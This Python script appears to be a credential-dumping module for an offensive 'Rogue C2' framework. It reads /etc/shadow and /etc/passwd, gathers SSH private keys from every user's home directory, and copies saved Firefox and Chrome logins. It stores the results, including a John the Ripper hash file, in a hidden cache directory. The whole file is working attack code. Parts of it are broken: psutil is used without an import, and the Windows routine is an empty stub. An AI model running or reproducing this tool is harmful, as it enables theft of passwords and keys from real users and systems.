#!/usr/bin/env python3
"""
PAYLOAD: Password Hash Extraction Module
DESCRIPTION: Extract password hashes from various sources (Linux/Windows)
AUTHOR: Rogue Red Team
VERSION: 2.1
SECURITY: This tool extracts sensitive credentials - Use only on authorized systems
"""
import os, sys, re, subprocess, json, base64, hashlib, datetime, socket, platform
import shutil, tempfile, struct, sqlite3, binascii, pwd, spwd, getpass
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

class HashDumper:
    def __init__(self):
        self.results = {
            "system_hashes": {},
            "shadow_file": None,
            "memory_dumps": [],
            "browser_credentials": [],
            "ssh_keys": [],
            "database_dumps": []
        }
    
    def dump_linux_hashes(self):
        """Extract Linux password hashes"""
        hashes = {}
        
        try:
            # Try to read /etc/shadow directly (requires root)
            if os.getuid() == 0:
                with open('/etc/shadow', 'r') as f:
                    shadow_content = f.read()
                    self.results["shadow_file"] = shadow_content
                    
                    # Parse shadow entries
                    for line in shadow_content.split('\n'):
                        if ':' in line:
                            parts = line.split(':')
                            if len(parts) >= 2 and parts[1] not in ['', '*', '!', '!!']:
                                hashes[parts[0]] = parts[1]
            else:
                # Fallback: use unshadow if available
                try:
                    unshadow_cmd = "unshadow /etc/passwd /etc/shadow 2>/dev/null"
                    output = subprocess.check_output(unshadow_cmd, shell=True).decode()
                    for line in output.split('\n'):
                        if ':' in line:
                            parts = line.split(':')
                            if len(parts) >= 2 and parts[1] not in ['x', '*', '!']:
                                hashes[parts[0]] = parts[1]
                except:
                    pass
            
            # Also get /etc/passwd for user list
            with open('/etc/passwd', 'r') as f:
                passwd_content = f.read()
                self.results["passwd_file"] = passwd_content
                
        except Exception as e:
            hashes["error"] = str(e)
        
        return hashes
    
    def dump_windows_hashes(self):
        """Extract Windows password hashes (SAM)"""
        hashes = {}
        
        if platform.system() == 'Windows':
            try:
                # Check for Mimikatz-like functionality
                # This is a placeholder - actual implementation requires admin privileges
                # and would use techniques like reg save or Volume Shadow Copy
                pass
                
            except Exception as e:
                hashes["error"] = f"Windows hash extraction failed: {str(e)}"
        
        return hashes
    
    def dump_memory_for_hashes(self):
        """Search memory for password hashes"""
        memory_dumps = []
        
        try:
            # Check running processes for passwords in memory
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    proc_info = proc.info
                    # Look for processes that might have passwords
                    sensitive_processes = ['ssh', 'su', 'sudo', 'passwd', 'mysql', 'psql']
                    if any(sp in proc_info['name'].lower() for sp in sensitive_processes):
                        memory_dumps.append({
                            "pid": proc_info['pid'],
                            "name": proc_info['name'],
                            "cmdline": ' '.join(proc_info['cmdline']) if proc_info['cmdline'] else ''
                        })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
        except Exception as e:
            memory_dumps.append({"error": str(e)})
        
        return memory_dumps
    
    def extract_ssh_keys(self):
        """Find and extract SSH keys"""
        ssh_keys = []
        
        try:
            # Look for SSH keys in common locations
            ssh_paths = [
                os.path.expanduser("~/.ssh/"),
                "/root/.ssh/",
                "/etc/ssh/",
                "/home/*/.ssh/",
                "/var/www/.ssh/"
            ]
            
            for path_pattern in ssh_paths:
                if '*' in path_pattern:
                    import glob
                    expanded_paths = glob.glob(path_pattern)
                else:
                    expanded_paths = [path_pattern]
                
                for path in expanded_paths:
                    if os.path.exists(path):
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'authorized_keys']:
                                    filepath = os.path.join(root, file)
                                    try:
                                        with open(filepath, 'r') as f:
                                            content = f.read()
                                            if "PRIVATE KEY" in content or "ssh-" in content:
                                                ssh_keys.append({
                                                    "path": filepath,
                                                    "type": "private_key" if "PRIVATE KEY" in content else "public_key",
                                                    "content": content[:500] + "..." if len(content) > 500 else content
                                                })
                                    except:
                                        continue
            
        except Exception as e:
            ssh_keys.append({"error": str(e)})
        
        return ssh_keys
    
    def dump_browser_credentials(self):
        """Extract credentials from browsers"""
        credentials = []
        
        try:
            # Firefox credentials
            firefox_profiles = self.extract_firefox_credentials()
            if firefox_profiles:
                credentials.append({"browser": "firefox", "profiles": firefox_profiles})
            
            # Chrome/Chromium credentials
            chrome_creds = self.extract_chrome_credentials()
            if chrome_creds:
                credentials.append({"browser": "chrome", "credentials": chrome_creds})
                
        except Exception as e:
            credentials.append({"error": str(e)})
        
        return credentials
    
    def extract_firefox_credentials(self):
        """Extract Firefox logins"""
        profiles = []
        
        try:
            firefox_path = os.path.expanduser("~/.mozilla/firefox/")
            if os.path.exists(firefox_path):
                for profile_dir in os.listdir(firefox_path):
                    if profile_dir.endswith('.default') or profile_dir.endswith('.default-release'):
                        profile_path = os.path.join(firefox_path, profile_dir)
                        
                        # Look for logins.json
                        logins_file = os.path.join(profile_path, 'logins.json')
                        if os.path.exists(logins_file):
                            with open(logins_file, 'r') as f:
                                logins_data = json.load(f)
                                profiles.append({
                                    "profile": profile_dir,
                                    "logins": logins_data.get("logins", [])[:10]  # Limit to first 10
                                })
                        
                        # Look for key4.db for decryption key
                        key_db = os.path.join(profile_path, 'key4.db')
                        if os.path.exists(key_db):
                            profiles.append({
                                "profile": profile_dir,
                                "key_db": "Present - contains encryption keys"
                            })
            
        except Exception as e:
            profiles.append({"error": f"Firefox extraction failed: {str(e)}"})
        
        return profiles
    
    def extract_chrome_credentials(self):
        """Extract Chrome saved passwords"""
        credentials = []
        
        try:
            chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
            if os.path.exists(chrome_path):
                # Copy the database to read it
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db').name
                shutil.copy2(chrome_path, temp_db)
                
                # Query the database
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                
                for row in rows:
                    url, username, encrypted_password = row
                    if username:
                        credentials.append({
                            "url": url,
                            "username": username,
                            "password": f"<encrypted - {len(encrypted_password)} bytes>" if encrypted_password else "<empty>"
                        })
                
                conn.close()
                os.unlink(temp_db)
            
        except Exception as e:
            credentials.append({"error": f"Chrome extraction failed: {str(e)}"})
        
        return credentials
    
    def execute(self):
        """Execute all hash dumping operations"""
        try:
            print("[+] Starting password hash extraction...")
            
            # Run all extractors
            self.results["system_hashes"]["linux"] = self.dump_linux_hashes()
            self.results["system_hashes"]["windows"] = self.dump_windows_hashes()
            self.results["memory_dumps"] = self.dump_memory_for_hashes()
            self.results["ssh_keys"] = self.extract_ssh_keys()
            self.results["browser_credentials"] = self.dump_browser_credentials()
            
            # Generate summary
            summary = {
                "timestamp": datetime.datetime.now().isoformat(),
                "hostname": socket.gethostname(),
                "extracted_hashes": len(self.results["system_hashes"]["linux"]) + len(self.results["system_hashes"]["windows"]),
                "ssh_keys_found": len(self.results["ssh_keys"]),
                "browser_credentials": sum(len(c.get("profiles", [])) if isinstance(c, dict) else 0 for c in self.results["browser_credentials"]),
                "memory_processes": len(self.results["memory_dumps"])
            }
            
            # Save detailed results
            output_dir = os.path.expanduser("~/.cache/.rogue/hashes")
            os.makedirs(output_dir, exist_ok=True)
            
            output_file = os.path.join(output_dir, f"hashdump_{socket.gethostname()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, default=str)
            
            # Also save hashes in John the Ripper format
            john_file = os.path.join(output_dir, f"hashes_john_{socket.gethostname()}.txt")
            with open(john_file, 'w') as f:
                for username, hash_val in self.results["system_hashes"]["linux"].items():
                    if hash_val and hash_val not in ['*', '!', '!!', 'x']:
                        f.write(f"{username}:{hash_val}\n")
            
            print(f"[+] Hash extraction complete. Results saved to: {output_file}")
            print(f"[+] John the Ripper format saved to: {john_file}")
            
            return json.dumps(summary, indent=2)
            
        except Exception as e:
            return f"[!] Hash extraction failed: {str(e)}"

# === Integration with Rogue C2 ===
def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    dumper = HashDumper()
    return dumper.execute()

if __name__ == "__main__":
    print(rogue_integration())
